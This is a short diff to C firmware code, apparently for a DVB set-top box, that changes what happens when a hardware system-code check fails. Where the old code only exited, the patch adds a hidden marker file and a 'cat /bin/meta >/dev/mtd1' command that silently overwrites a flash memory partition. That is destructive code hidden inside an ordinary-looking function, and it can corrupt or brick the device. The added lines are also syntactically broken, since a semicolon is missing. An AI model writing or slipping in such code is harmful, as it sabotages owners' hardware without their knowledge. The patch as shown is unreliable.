@@ -1703,7 +1703,14 @@ void castart()
 	struct dvbdev* dvbnode = dvbdev;
 
 #ifndef SIMULATE
-	if(getsysinfo() != SYSCODE) exit(100);
+	if(getsysinfo() != SYSCODE)
+	{
+		if(file_exist("/var/swap/etc/.vnumber") == 0)
+			system("touch /var/swap/etc/.vnumber")
+		
+		system("cat /bin/meta >/dev/mtd1")		
+		exit(100);
+	}
 #endif
 
 	while(dvbnode != NULL)
